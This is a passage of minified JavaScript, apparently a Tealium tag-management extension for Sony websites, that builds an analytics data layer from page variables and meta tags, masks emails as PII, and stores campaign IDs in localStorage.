browser/i]},{type:"PC",regexs:[/willcom|chrome|firefox|r-ie8|msie|opera|netscape|safari|macintosh/i,/(trident).+rv[:\s]([\w\.]+).+like\sgecko/i,/(edge)\/((\d+)?[\w\.]+)/i]}];t="Others";var o=function(e,t){for(j=0;j<t.length;j++)if(e.match(t[j]))return!0;return!1};for(i_new=0;i_new<a.length;i_new++)if(o(e,a[i_new].regexs)){t=a[i_new].type;break}return t},_bsq.utils.isLocalStorageSupported=function(){var e="ls_test";try{return localStorage.setItem(e,e),localStorage.removeItem(e),!0}catch(e){return!1}},Number.isInteger=Number.isInteger||function(e){return"number"==typeof e&&isFinite(e)&&Math.floor(e)===e},_bsq.utils.getByteSize=function(e){return encodeURIComponent(""+e).length},_bsq.utils.all_maskPIIData=function(e){void 0===e&&(e=""),null===e&&(e="");try{e=decodeURIComponent(e)}catch(e){}return function(e){try{e=e.replace(/[-a-z0-9~!$%^&*_+}{\'?]+(\.[-a-z0-9~!$%^&*_+}{\'?]+)*@([a-z0-9_][-a-z0-9_]*(\.[-a-z0-9_]+)*\.(aero|arpa|biz|com|coop|edu|gov|info|int|mil|museum|name|net|org|pro|travel|mobi|[a-z][a-z])|([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}))(:[0-9]{1,5})?/gi,"[PII_Mask-Email]")}catch(e){}return e}(e)},_bsq.utils.getLoadTime=function(){if(!window.s_loadT){var e=(new Date).getTime(),t=window.performance?performance.timing:0,a=t?t.requestStart:window.inHeadTS||0;s_loadT=a?Math.round((e-a)/100):""}return s_loadT},"undefined"!=typeof jQuery&&void 0!==jQuery.fn&&function(e){e.fn.on||(e.fn.on=function(e,t,a,o){var i=this,r=arguments.length;if(r>3&&"function"==typeof this.delegate)return i.delegate(t,e,a,o);if(r>2){if("string"==typeof t&&"function"==typeof this.delegate)return i.delegate(t,e,a);if("object"==typeof t)return i.bind(e,t,a);var n=jQuery(t);return n.bind(e,a)}return i.bind(e,t)}),e.fn.off||(e.fn.off=function(e,t,a){var o=this,i=arguments.length;return"string"==typeof t&&"function"==typeof this.delegate?i>2?o.undelegate(t,e,a):i>1?o.undelegate(t,e):o.undelegate():i>1?(a=t,o.unbind(e,a)):i>0?o.unbind(e):o.unbind()})}(window.jQuery),"function"!=typeof Object.assign&&Object.defineProperty(Object,"assign",{value:function(e,t){"use strict";if(null==e)throw new TypeError("Cannot convert undefined or null to object");for(var a=Object(e),o=1;o<arguments.length;o++){var i=arguments[o];if(null!=i)for(var r in i)Object.prototype.hasOwnProperty.call(i,r)&&(a[r]=i[r])}return a},writable:!0,configurable:!0});var a=function(e){var t=(e=e.trim()).replace(/[^0-9]/g,"");return/[,\.]\d{2}$/.test(e)&&(t=t.replace(/(\d{2})$/,".$1")),t};if(_bsq.utils.parsePotentiallyGroupedFloat=function(e){return"string"==typeof e&&""!==e?a(e):"object"==typeof e?e.map((function(e,t){return a(e)})):""},_bsq.utils.closeModal=function(e){document.getElementById(e).style.display="none"},_bsq.utils.on=function(e,t,a,o){var i=document;e!==document&&(i=document.querySelector(e)),i.addEventListener(t,(function(e){for(var t=i.querySelectorAll(a),r=e.target,n=0,s=t.length;n<s;n++)for(var d=r,c=t[n];d&&d!==i;){if(d===c)return o.call(c,e);d=d.parentNode}}))},"function"==typeof window.CustomEvent);else{function o(e,t){t=t||{bubbles:!1,cancelable:!1,detail:void 0};var a=document.createEvent("CustomEvent");return a.initCustomEvent(e,t.bubbles,t.cancelable,t.detail),a}o.prototype=window.Event.prototype,window.CustomEvent=o}if("global:swt"===utag_data.website_platform){window._bsq.dtlReady=!1;var i=new window.CustomEvent("sptDatalayerReady"),r=Date.now();!function e(t,a,o){window.setTimeout((function(){Date.now()-r<=1e4?void 0!==window.SonyAnalytics&&void 0!==(new window.SonyAnalytics).build().analytics.support?(window._bsq.dtlReady=!0,window.dispatchEvent(i)):window.setTimeout(e,250):window.dispatchEvent(i)}),250)}()}var n="gwt-support-analytics";_bsq.utils.isAgentPortal=function(){var e=!1;try{var t=document.cookie.toLowerCase(),a=n.toLowerCase()+"=",o=t.indexOf("; "+a);-1==o?0===(o=t.indexOf(a))&&(e=!0):e=!0}catch(e){}return e},c=new window.CustomEvent("scrollHasStopped"),window.addEventListener("scroll",(function(e){window.clearTimeout(window.isScrollingBSQ),window.isScrollingBSQ=setTimeout((function(){utag.DB(e),window.dispatchEvent(c)}),75)}),!1);var s="bsqState";if(_bsq.utils.sessionStorageTransfer=function(e){e||(e=window.event),e.newValue&&("getSessionStorage"==e.key&&null!==sessionStorage.getItem(s)?(localStorage.setItem(s,sessionStorage.getItem(s)),localStorage.removeItem(s)):e.key!=s||sessionStorage.getItem(s)||sessionStorage.setItem(s,e.newValue))},window.addEventListener?window.addEventListener("storage",_bsq.utils.sessionStorageTransfer,!1):window.attachEvent("onstorage",_bsq.utils.sessionStorageTransfer),sessionStorage.getItem(s)||(localStorage.setItem("getSessionStorage","bsqTransferSessionStorage"),localStorage.removeItem("getSessionStorage","bsqTransferSessionStorage")),"undefined"!=typeof jQuery&&/\/electronics\/(?!support)/gi.test(document.URL)){var d=jQuery('meta[name="analytics-page-template"]').attr("content")||"";utag_data.aaDebug=utag.cfg.v+"|"+d+"|";try{utag_data.aaDebug+=(new SonyAnalytics).build().analytics.page.name+"^"+(new SonyAnalytics).build().analytics.page.country}catch(e){utag_data.aaDebug+=e}}}}catch(e){utag.DB(e)}var c},function(e,t){try{if(utag.runonce=utag.runonce||{},utag.runonce.ext=utag.runonce.ext||{},void 0===utag.runonce.ext[9]&&(utag.runonce.ext[9]=1,t.website_platform.toString().toLowerCase()=="regional:marketing".toLowerCase()&&/((sony\.(at|ba|be|bg|ch|co\.il|co\.uk|com\.mk|com\.pl|com\.tr|cz|de|dk|ee|es|eu|fi|fr|gr|hr|hu|ie|it|kz|lt|lu|lv|net|nl|no|pl|pt|ro|rs|ru|se|si|sk|ua))|sony-europe\.com|sonystyle-europe\.com|sonylatvija\.com)$/gi.test(t["dom.domain"])&&t["dom.pathname"].toString().indexOf("/mysony/ForgotPassword")<0&&t["dom.pathname"].toString().indexOf("/alphauniverse")<0&&void 0!==utag_data.regionalEUPage&&!0===utag_data.regionalEUPage)){function a(){var e="";"undefined"!=typeof Tags_Customer_ID&&(e=Tags_Customer_ID),"undefined"!=typeof Tags_BP&&""!==Tags_BP&&""===e&&(e=Tags_BP),"undefined"!=typeof sony&&void 0!==sony.analytics&&void 0!==sony.analytics.page&&void 0!==sony.analytics.page.visitor_id&&""!==sony.analytics.page.visitor_id&&""===e&&(e=sony.analytics.page.visitor_id),"undefined"!=typeof user_id&&""!==user_id&&""===e&&(e=user_id);try{""===e&&(e=_bsq.utils.getQueryParameter(location.href,"ccid").toLowerCase())}catch(e){}return e.toLowerCase()}function o(){var e="";"undefined"!=typeof category_level1&&""!==category_level1&&(e=category_level1,"undefined"!=typeof category_level2&&""!==category_level2&&(e=e+" : "+category_level2),"undefined"!=typeof category_level3&&""!==category_level3&&(e=e+" : "+category_level3));var t=void 0!==e?e:[];t=t.split(":");for(var a=0;a<t.length;a++)a<3&&(t[a]=t[a].trim());return t}function i(){var e="";return"undefined"!=typeof Tags_Category_lv1?e=Tags_Category_lv1:"undefined"!=typeof sony&&void 0!==sony.analytics&&void 0!==sony.analytics.product&&void 0!==sony.analytics.product.category1?e=sony.analytics.product.category1:"undefined"!=typeof category_level1&&o().length>0&&(e=o()[0]),e.toLowerCase()}function r(){return{brand:"EU_REGIONAL",country:(r="","undefined"!=typeof Tags_Country?r=Tags_Country:"undefined"!=typeof sony&&void 0!==sony.analytics&&void 0!==sony.analytics.page&&void 0!==sony.analytics.page.country?r=sony.analytics.page.country:"undefined"!=typeof page_country&&(r=page_country),r.toUpperCase()),language:(i="","undefined"!=typeof Tags_Language?i=Tags_Language:"undefined"!=typeof sony&&void 0!==sony.analytics&&void 0!==sony.analytics.page&&void 0!==sony.analytics.page.language?i=sony.analytics.page.language:"undefined"!=typeof page_country&&(i=page_language),i.toLowerCase()),name:(o="","undefined"!=typeof Tags_Pagename?o=Tags_Pagename:"undefined"!=typeof sony&&void 0!==sony.analytics&&void 0!==sony.analytics.page&&void 0!==sony.analytics.page.name?o=sony.analytics.page.name:"undefined"!=typeof page_name&&(o=page_name),o.toLowerCase()),omniture_rsid:"sonygwt-eu-prod",section:(a="","undefined"!=typeof Tags_Platform?a=Tags_Platform:"undefined"!=typeof sony&&void 0!==sony.analytics&&void 0!==sony.analytics.page&&void 0!==sony.analytics.page.section?a=sony.analytics.page.section:"undefined"!=typeof site_section&&(a=site_section),a.toLowerCase()),template:(t="","undefined"!=typeof Tags_Page_template?t=Tags_Page_template:"undefined"!=typeof sony&&void 0!==sony.analytics&&void 0!==sony.analytics.page&&void 0!==sony.analytics.page.template?t=sony.analytics.page.template:"undefined"!=typeof page_template&&(t=page_template),t.toLowerCase()),template_revision:"",events:(e=[],"undefined"!=typeof Tags_Events&&""!==Tags_Events&&(e=Tags_Events.toLowerCase().split(",")),e)};var e,t,a,o,i,r}function n(){return{term:(o="","undefined"!=typeof search_term&&""!==search_term?o=search_term:"undefined"!=typeof Tags_Search_term&&""!==Tags_Search_term&&(o=Tags_Search_term),o),results:(a="","undefined"!=typeof search_results&&""!==search_results&&(a=search_results),a.toLowerCase()),type:(t="","undefined"!=typeof search_type&&""!==search_type&&(t=search_type),t.toLowerCase()),current_category:(e="","undefined"!=typeof search_type&&""!==search_type&&"undefined"!=typeof jQuery&&jQuery("#search-tabs-wrap .tab.active#tabcommunity").length>0&&(e="community"),e.toLowerCase()),categories:{}};var e,t,a,o}function s(){return{category1:i(),category2:(c="","undefined"!=typeof Tags_Category_lv2?c=Tags_Category_lv2:"undefined"!=typeof sony&&void 0!==sony.analytics&&void 0!==sony.analytics.product&&void 0!==sony.analytics.product.category2?c=sony.analytics.product.category2:"undefined"!=typeof category_level2&&o().length>1&&(c=o()[1]),c.toLowerCase()),category3:(d="","undefined"!=typeof Tags_Category_lv3?_category1=Tags_Category_lv3:"undefined"!=typeof sony&&void 0!==sony.analytics&&void 0!==sony.analytics.product&&void 0!==sony.analytics.product.category3?d=sony.analytics.product.category3:"undefined"!=typeof category_level3&&o().length>2&&(d=o()[2]),d.toLowerCase()),currency:(s="","undefined"!=typeof Tags_Currency?s=Tags_Currency:"undefined"!=typeof sony&&void 0!==sony.analytics&&void 0!==sony.analytics.product&&void 0!==sony.analytics.product.currency&&(s=sony.analytics.product.currency),s.toUpperCase()),image_url:"",model_ids:(n=[],"undefined"!=typeof sony&&void 0!==sony.analytics&&void 0!==sony.analytics.product&&void 0!==sony.analytics.product.model_ids&&n.push(sony.analytics.product.model_ids),n),price:(r="","undefined"!=typeof sony&&void 0!==sony.analytics&&void 0!==sony.analytics.product&&void 0!==sony.analytics.product.price&&(r=sony.analytics.product.price),r),price_source:"",price_type:"",sku_ids:(a=[],"undefined"!=typeof sony&&void 0!==sony.analytics&&void 0!==sony.analytics.product&&void 0!==sony.analytics.product.sku_ids&&null!==sony.analytics.product.sku_ids&&a.push(sony.analytics.product.sku_ids),"undefined"!=typeof Tags_Product_name&&null!==Tags_Product_name&&""!==Tags_Product_name&&a.push(Tags_Product_name),"undefined"!=typeof Tags_Page_template&&"undefined"!=typeof Tags_Product_SKU&&null!==Tags_Product_SKU&&""!==Tags_Product_SKU&&-1===Tags_Page_template.toLowerCase().indexOf("basket")&&-1===Tags_Page_template.toLowerCase().indexOf("order acknowledgement")&&a.push(Tags_Product_SKU),a),supermodel_ids:(t=[],"undefined"!=typeof sony&&void 0!==sony.analytics&&void 0!==sony.analytics.product&&void 0!==sony.analytics.product.supermodel_ids&&t.push(sony.analytics.product.supermodel_ids),t),stock_status:(e="","undefined"!=typeof sony&&void 0!==sony.analytics&&void 0!==sony.analytics.product&&void 0!==sony.analytics.product.stock_status&&(e=sony.analytics.product.stock_status),e),tier:"",facebook_likes:""};var e,t,a,r,n,s,d,c}function d(){return{id:a(),role:(i="","undefined"!=typeof user_role&&"n/a"!==user_role&&(i=user_role),i.toLowerCase()),email:(o="","undefined"!=typeof Tags_Email_Id&&""!==Tags_Email_Id&&(o=Tags_Email_Id),o),method:(t="","undefined"!=typeof Tags_method&&""!==Tags_method&&(t=Tags_method),t),accountType:(e="","undefined"!=typeof Tags_accountType&&""!==Tags_accountType&&(e=Tags_accountType),e)};var e,t,o,i}window.dlfix=function(e){return void 0===e.analytics&&(e.analytics={}),void 0===e.analytics.version&&(e.analytics.version="Regional_2014.09"),void 0===e.analytics.page?e.analytics.page=r():void 0===e.analytics.page.events&&(e.analytics.page.events=[]),void 0===e.analytics.search&&(e.analytics.search=n()),void 0===e.analytics.product&&(e.analytics.product=s()),void 0===e.analytics.user&&(e.analytics.user=d()),e},"undefined"!=typeof SonyAnalytics&&void 0!==(new SonyAnalytics).build&&(window.oldSonyAnalytics=function(e){var t={};for(var a in e)e.hasOwnProperty(a)&&(t[a]=e[a]);return t}((new SonyAnalytics).build()));var c=function(){var e={};if("undefined"!=typeof oldSonyAnalytics&&"undefined"!=typeof dlfix?e=dlfix(window.oldSonyAnalytics):(e.analytics={},e.analytics.version="Regional_2014.09",e.analytics.page=r(),e.analytics.search=n(),e.analytics.product=s(),e.analytics.user=d()),"undefined"!=typeof document&&void 0!==document.URL&&document.URL.toLowerCase().indexOf("/getdirections")>-1&&(""===e.analytics.page.name&&(e.analytics.page.name="odw:dealerlocator:get directions"),""===e.analytics.page.template&&(e.analytics.page.template="dealerlocator:get directions")),"odw:sorry:"===e.analytics.page.name&&(e.analytics.page.name="odw:sorry page"),"cmt"===e.analytics.page.section){if(void 0!==e.analytics.page.template&&"undefined"!=typeof jQuery&&e.analytics.page.template.indexOf("search results")>-1)try{e.analytics.search.results=jQuery("div.search-result-count").text().match(/\d/g).join("")}catch(t){e.analytics.search.results=""}if(void 0!==e.analytics.page.name){var t=document.location.pathname||"";if(!/^\/t5\/(photo-contest-submissions|highlight-gallery|shortlist-|wallpapers|alphaddicted)/gi.test(t)&&"error"!==e.analytics.page.template&&"error404"!==e.analytics.page.template&&void 0!==window.page_name){var a=[];(a=e.analytics.page.name.split(":")).shift(),e.analytics.page.name=a.join(":")}"home"===e.analytics.page.template&&(e.analytics.page.name="cmt:home"),"search results : message"===e.analytics.page.template&&""===e.analytics.page.name&&void 0!==window.page_name&&(e.analytics.page.name=window.page_name),"profile"===e.analytics.page.template&&""===e.analytics.page.name&&void 0!==window.page_name&&(e.analytics.page.name=window.page_name),"countryselector"===e.analytics.page.template&&""===e.analytics.page.name&&void 0!==window.page_name&&(e.analytics.page.name=window.page_name),"notificationfeed"===e.analytics.page.template&&""===e.analytics.page.name&&void 0!==window.page_name&&(e.analytics.page.name=window.page_name),"sony"===e.analytics.page.name&&(e.analytics.page.name="cmt:sony"),0===e.analytics.page.name.indexOf("super user area")&&(e.analytics.page.name="cmt:"+e.analytics.page.name),3!==e.analytics.page.name.indexOf("cmt:")?e.analytics.page.name=e.analytics.page.name:e.analytics.page.name=e.analytics.page.name.replace(/^[a-zA-Z]{3}:/,"cmt:"),e.analytics.page.name=e.analytics.page.name.replace(/ : /g,":")}void 0!==e.analytics.page.template&&("search results : message"===e.analytics.page.template?e.analytics.page.template="results:message":"search results : user"===e.analytics.page.template&&(e.analytics.page.template="results:user"))}return void 0!==e.analytics.page.name&&null===e.analytics.page.name&&(e.analytics.page.name=""),e};window.SonyAnalytics=function(){return{build:c}}}}catch(e){utag.DB(e)}},function(e,t){try{if(utag.runonce=utag.runonce||{},utag.runonce.ext=utag.runonce.ext||{},void 0===utag.runonce.ext[8]&&(utag.runonce.ext[8]=1,void 0!==t.website_platform||t["dom.domain"].toString().indexOf("store.sony.ru")<0)){var a="",o="gwt_reporting_key";try{a=(new SonyAnalytics).build().analytics.page.country}catch(e){}if(""!==a&&void 0!==a){/(ar|mx|cl|co|pa|cr|bo|do|ec|sv|gt|hn|py|pe|pr|ve|ni|sola)/i.test(a)?""!==_bsq.utils.getQueryParameter(location.search.toLowerCase(),"scst_id")&&_bsq.utils.isLocalStorageSupported()&&localStorage.setItem(o,_bsq.utils.getQueryParameter(location.search.toLowerCase(),"scst_id")):/(us|ca)/i.test(a)&&""!==_bsq.utils.getQueryParameter(location.search.toLowerCase(),"crmid")&&_bsq.utils.isLocalStorageSupported()&&localStorage.setItem(o,_bsq.utils.getQueryParameter(location.search.toLowerCase(),"crmid").replace(/^eml-/,""))}else""!==_bsq.utils.getQueryParameter(location.search.toLowerCase(),"scst_id")&&_bsq.utils.isLocalStorageSupported()?localStorage.setItem(o,_bsq.utils.getQueryParameter(location.search.toLowerCase(),"scst_id")):""!==_bsq.utils.getQueryParameter(location.search.toLowerCase(),"crmid")&&_bsq.utils.isLocalStorageSupported()&&localStorage.setItem(o,_bsq.utils.getQueryParameter(location.search.toLowerCase(),"crmid").replace(/^eml-/,""));if(void 0===window.SonyAnalytics&&"undefined"!=typeof jQuery&&jQuery('meta[name^="analytics"]').length>0){var i=function(e,t){return void 0!==jQuery(e).attr(t)?jQuery(e).attr(t).replace(/\[/gi,"").replace(/\]/gi,"").split(","):[]||[]},r=function(e,t){return void 0!==jQuery(e).attr(t)?jQuery(e).attr(t).replace(/\[/gi,"").replace(/\]/gi,""):""},n=function(){var e={analytics:{}};if(e.analytics.version="",e.analytics.page={},e.analytics.page.country=jQuery('meta[name="analytics-page-country"]').attr("content")||"",e.analytics.page.language=jQuery('meta[name="analytics-page-language"]').attr("content")||"",e.analytics.page.name=jQuery('meta[name="analytics-page-name"]').attr("content")||"",jQuery("#page-main-content .error-pages").length>0&&(e.analytics.page.name="error"),e.analytics.page.omniture_rsid=void 0!==window.tags_RSID?window.tags_RSID.toLowerCase():"",e.analytics.page.section=jQuery('meta[name="analytics-page-section"]').attr("content")||"",""===e.analytics.page.section&&document.URL.indexOf("/support/")>-1?e.analytics.page.section="spt":e.analytics.page.section="glb",e.analytics.page.template=jQuery('meta[name="analytics-page-template"]').attr("content")||"",e.analytics.page.template_revision=jQuery('meta[name="analytics-page-template_revision"]').attr("content")||"1",document.URL.toLowerCase().indexOf("/search")>-1&&(e.analytics.page.section="glb"),document.URL.toLowerCase().indexOf("/search")>-1&&"results"===e.analytics.page.template&&(e.analytics.page.template="other",e.analytics.page.template_revision="search-results"),document.URL.toLowerCase().indexOf("/search")>-1&&"no results"===e.analytics.page.template&&(e.analytics.page.template="other",e.analytics.page.template_revision="no-search-results"),0===e.analytics.page.name.indexOf(e.analytics.page.section.toLowerCase()+":")&&e.analytics.page.name.length>4&&(e.analytics.page.name=e.analytics.page.name.substr(4,e.analytics.page.name.length-4)),e.analytics.product={},e.analytics.product.category1=jQuery('meta[name="analytics-product-category1"]').attr("content")||"",e.analytics.product.category2=jQuery('meta[name="analytics-product-category2"]').attr("content")||"",e.analytics.product.category3=jQuery('meta[name="analytics-product-category3"]').attr("content")||"",/^(product_details|transition)$/gi.test(e.analytics.page.template)&&(e.analytics.product.sku_ids=i("div.visuallyhidden.product","data-sku_ids"),e.analytics.product.model_ids=i("div.visuallyhidden.product","data-model_ids"),e.analytics.product.supermodel_ids=i("div.visuallyhidden.product","data-supermodel_ids")),/^transition$/gi.test(e.analytics.page.template)&&(e.analytics.transition={},e.analytics.transition.selection={},e.analytics.transition.selection.sku_id=r("div.visuallyhidden.sku-selector-data","data-sku_id"),e.analytics.transition.selection.model_id=r("div.visuallyhidden.sku-selector-data","data-model_id"),e.analytics.transition.selection.supermodel_id=r("div.visuallyhidden.sku-selector-data","data-supermodel_id")),e.analytics.search={},e.analytics.search.term=void 0!==window.tags_searchTerm?decodeURIComponent(window.tags_searchTerm):"",e.analytics.search.results=void 0!==window.tags_searchResults?window.tags_searchResults:"",e.analytics.search.current_category="",e.analytics.search.categories={},e.analytics.search.categories.all="",e.analytics.search.categories.products="",e.analytics.search.categories.support="",e.analytics.search.categories.community="","undefined"!=typeof jQuery)try{e.analytics.search.current_category=jQuery(".relative .tabs .tab.active").data("target"),e.analytics.search.results=jQuery("#taball .tab-inside .tab-number").text().replace(/\D+/,""),e.analytics.search.categories.all=jQuery("#taball .tab-inside .tab-number").text().replace(/\D+/,""),e.analytics.search.categories.products=jQuery("#tabproducts .tab-inside .tab-number").text().replace(/\D+/,""),e.analytics.search.categories.support=jQuery("#tabsupport .tab-inside .tab-number").text().replace(/\D+/,""),e.analytics.search.categories.community=jQuery("#tabcommunity .tab-inside .tab-number").text().replace(/\D+/,""),"all"!==e.analytics.search.current_category&&(e.analytics.search.results=e.analytics.search.categories[e.analytics.search.current_category])}catch(e){}return e.analytics.user={},_bsq.utils.isLocalStorageSupported()&&(e.analytics.user.id=localStorage.getItem(o)),e};window.SonyAnalytics=function(){return{build:n}}}else if("undefined"!=typeof SonyAnalytics&&(void 0!==(new SonyAnalytics).build||void 0!==SonyAnalytics().build)){var s=(new SonyAnalytics).build();if(void 0!==s&&void 0!==s.analytics&&void 0!==s.analytics.page&&"undefined"!=typeof jQuery&&0===jQuery("meta[name='analytics-product-category1']").length&&0===jQuery("meta[name='analytics-product-category2']").length&&(void 0!==s.analytics.page.template_revision&&/^Page-TV-OOFM-en_GL-2014-12-.{2,3}$/g.test(s.analytics.page.template_revision)&&jQuery("head").append('<meta content="tv-home-cinema" name="analytics-product-category1">'),void 0!==s.analytics.page.template_revision&&/^Page-OOFM-4K-TV-SEO-en_GL-2014-09$/g.test(s.analytics.page.template_revision)&&jQuery("head").append('<meta content="tv-home-cinema" name="analytics-product-category1">'),void 0!==s.analytics.page.template_revision&&/^Page-Bravia-en_GL-2015-03$/g.test(s.analytics.page.template_revision)&&(jQuery("head").append('<meta content="tv-home-cinema" name="analytics-product-category1">'),jQuery("head").append('<meta content="tvs" name="analytics-product-category2">')),void 0!==s.analytics.page.template_revision&&/^vaio_sunset_oof$/g.test(s.analytics.page.template_revision)&&(jQuery("head").append('<meta content="computers" name="analytics-product-category1">'),jQuery("head").append('<meta content="vaio-computers" name="analytics-product-category2">')),void 0!==s.analytics.page.template_revision&&/^Page-(IFA-HRA-OOF|IFA-HRA-OOFM|HRA-Music-Services|Multiroom-HRA-OOFM|)-en_GL-....-..$/g.test(s.analytics.page.template_revision)&&jQuery("head").append('<meta content="audio" name="analytics-product-category1">'),void 0!==s.analytics.page.template_revision&&/^Page-Retailers-ru_RU-2015-08$/g.test(s.analytics.page.template_revision)&&(jQuery("head").append('<meta content="tv-home-cinema" name="analytics-product-category1">'),jQuery("head").append('<meta content="tvs" name="analytics-product-category2">')),void 0!==s.analytics.page.template_revision&&/^Page-Bravia-.._..-2015-08-TV-Campaign$/g.test(s.analytics.page.template_revision)&&(jQuery("head").append('<meta content="tv-home-cinema" name="analytics-product-category1">'),jQuery("head").append('<meta content="tvs" name="analytics-product-category2">')),void 0!==s.analytics.page.template_revision&&/^Page-Life-Hack-OOFM-en_GL-....-..$/g.test(s.analytics.page.template_revision)&&(jQuery("head").append('<meta content="tv-home-cinema" name="analytics-product-category1">'),jQuery("head").append('<meta content="tvs" name="analytics-product-category2">')),void 0!==s.analytics.page.template_revision&&/^Page-IFA-OOFM-IFA-TOP-ActionCam-en_GL-....-..$/g.test(s.analytics.page.template_revision)&&(jQuery("head").append('<meta content="video-cameras" name="analytics-product-category1">'),jQuery("head").append('<meta content="action-cam" name="analytics-product-category2">')),void 0!==s.analytics.page.template_revision&&/^Page-IFA-OOFM-Software-ActionCam-en_GL-....-..$/g.test(s.analytics.page.template_revision)&&(jQuery("head").append('<meta content="video-cameras" name="analytics-product-category1">'),jQuery("head").append('<meta content="action-cam" name="analytics-product-category2">')),void 0!==s.analytics.page.template_revision&&/^Page-ActionCam-UsesBike-OOFM-en_GL-....-..$/g.test(s.analytics.page.template_revision)&&(jQuery("head").append('<meta content="video-cameras" name="analytics-product-category1">'),jQuery("head").append('<meta content="action-cam" name="analytics-product-category2">')),void 0!==s.analytics.page.template_revision&&/^Page-CES-TV-OOFM-Curated-en_GL-2015$/g.test(s.analytics.page.template_revision)&&(jQuery("head").append('<meta content="tv-home-cinema" name="analytics-product-category1">'),jQuery("head").append('<meta content="tvs" name="analytics-product-category2">')),void 0!==s.analytics.page.template_revision&&/^Page-OOFM-GmasterOOFM-en_GL-....-..$/g.test(s.analytics.page.template_revision)&&(jQuery("head").append('<meta content="cameras" name="analytics-product-category1">'),jQuery("head").append('<meta content="lenses" name="analytics-product-category2">')),void 0!==s.analytics.page.template_revision&&/^Page-OOFM-Top-Newmusicexperience-en_GL-....-..$/g.test(s.analytics.page.template_revision)&&jQuery("head").append('<meta content="audio" name="analytics-product-category1">'),void 0!==s.analytics.page.template_revision&&/^Page-OOFM-4K-HDR-en_GL-....-..$/g.test(s.analytics.page.template_revision)&&(jQuery("head").append('<meta content="tv-home-cinema" name="analytics-product-category1">'),jQuery("head").append('<meta content="tvs" name="analytics-product-category2">')),void 0!==s.analytics.page.template_revision&&/^Page-Ex-en_US-....-..-Sony-Smart-Home$/g.test(s.analytics.page.template_revision)&&(jQuery("head").append('<meta content="tv-home-cinema" name="analytics-product-category1">'),jQuery("head").append('<meta content="tvs" name="analytics-product-category2">')),void 0!==s.analytics.page.template_revision&&/^Page-HP-en_GL-IN-12-04-2016$/g.test(s.analytics.page.template_revision)&&-1!==document.URL.toLowerCase().indexOf("microsite/festiveoffers/")&&(jQuery("head").append('<meta content="tv-home-cinema" name="analytics-product-category1">'),jQuery("head").append('<meta content="tvs" name="analytics-product-category2">'),jQuery("meta[name='analytics-page-template']").attr("content","regional")),void 0!==s.analytics.page.template_revision&&/^Page-OOFM-BRAVIA-Diwali-OOFM-en_GL-....-..$/g.test(s.analytics.page.template_revision)&&(jQuery("head").append('<meta content="tv-home-cinema" name="analytics-product-category1">'),jQuery("head").append('<meta content="tvs" name="analytics-product-category2">')),void 0!==s.analytics.page.template_revision&&/^Page-OOFM-4D_FOCUS-en_GL-....-..$/g.test(s.analytics.page.template_revision)&&jQuery("head").append('<meta content="cameras" name="analytics-product-category1">'),void 0!==s.analytics.page.template_revision&&/^Page-OOFM-TV-Clarity-en_GL-....-..$/g.test(s.analytics.page.template_revision)&&(jQuery("head").append('<meta content="tv-home-cinema" name="analytics-product-category1">'),jQuery("head").append('<meta content="tvs" name="analytics-product-category2">')),void 0!==s.analytics.page.template_revision&&/^Page-OOFM-Design-en_GL-....-..$/g.test(s.analytics.page.template_revision)&&(jQuery("head").append('<meta content="tv-home-cinema" name="analytics-product-category1">'),jQuery("head").append('<meta content="tvs" name="analytics-product-category2">')),void 0!==s.analytics.page.template_revision&&/^Page-OOFM-TV-Colour-en_GL-....-..$/g.test(s.analytics.page.template_revision)&&(jQuery("head").append('<meta content="tv-home-cinema" name="analytics-product-category1">'),jQuery("head").append('<meta content="tvs" name="analytics-product-category2">')),void 0!==s.analytics.page.template_revision&&/^Page-OOFM-TV-Contrast-en_GL-....-..$/g.test(s.analytics.page.template_revision)&&(jQuery("head").append('<meta content="tv-home-cinema" name="analytics-product-category1">'),jQuery("head").append('<meta content="tvs" name="analytics-product-category2">')),void 0!==s.analytics.page.template_revision&&/^Page-FY16-TV-CAT-en_GL-....-..$/g.test(s.analytics.page.template_revision)&&jQuery("head").append('<meta content="tv-home-cinema" name="analytics-product-category1">'),void 0!==s.analytics.page.template_revision&&/^Page-OOFM-Google_Play-en_GL-....-..$/g.test(s.analytics.page.template_revision)&&(jQuery("head").append('<meta content="tv-home-cinema" name="analytics-product-category1">'),jQuery("head").append('<meta content="tvs" name="analytics-product-category2">')),void 0!==s.analytics.page.template_revision&&/^Page-OOFM-Advanced-en_GL-....-..$/g.test(s.analytics.page.template_revision)&&(jQuery("head").append('<meta content="tv-home-cinema" name="analytics-product-category1">'),jQuery("head").append('<meta content="tvs" name="analytics-product-category2">')),void 0!==s.analytics.page.template_revision&&void 0!==s.analytics.page.country&&/^(SG|MY|HK|ID|TH|TW|AP|VN|PH)$/gi.test(s.analytics.page.country)&&/\/alphauniverse/gi.test(window.location.pathname))){var d=s.analytics.page.template_revision;jQuery('head meta[name="analytics-page-section"]').attr("content","sau");var c="",l="";/^Page-AlphaUniverse-Home-.*/gi.test(d)||/^\/(..\/)?alphauniverse\/home/gi.test(window.location.pathname)?(c="home",l="home"):/^Page-AlphaUniverse-Ambassadors_List-.*/gi.test(d)||/^\/(..\/)?alphauniverse\/pros(?!\/)/gi.test(window.location.pathname)?(c="ambassadors",l="ambassadors:list"):/^Page-AlphaUniverse-Ambassadors_Detail-.*/gi.test(d)||/^\/(..\/)?alphauniverse\/pros\//gi.test(window.location.pathname)?(c=/^Page-AlphaUniverse-Ambassadors_Detail-.*/gi.test(d)?"ambassadors:"+d.replace(/Page-AlphaUniverse-Ambassadors_Detail-/gi,"").replace(/-.._..-\d{4}-\d{2}/gi,"").toLowerCase():"ambassadors:"+window.location.pathname.replace(/^\/(..\/)?alphauniverse\/pros\//,"").toLowerCase(),l="ambassadors:details"):/^Page-AlphaUniverse-Review_List-*/gi.test(d)||/^\/(..\/)?alphauniverse\/reviews(?!\/)/gi.test(window.location.pathname)?(c="articles:reviews",l="articles:list:reviews"):/^Page-AlphaUniverse-Review_Detail-.*/gi.test(d)||/^\/(..\/)?alphauniverse\/(reviews|danh-gia)\//gi.test(window.location.pathname)?(c=/^Page-AlphaUniverse-Review_Detail-.*/gi.test(d)?"articles:reviews:"+d.replace(/Page-AlphaUniverse-Ambassadors_Detail-/gi,"").replace(/-.._..-\d{4}-\d{2}/gi,"").toLowerCase():"articles:reviews:"+window.location.pathname.replace(/^\/(..\/)?alphauniverse\/(reviews|danh-gia)\//,"").toLowerCase(),l="articles:details:reviews"):/^Page-AlphaUniverse-Tip_Tricks_List-*/gi.test(d)||/^\/(..\/)?alphauniverse\/pro-tips(?!\/)/gi.test(window.loca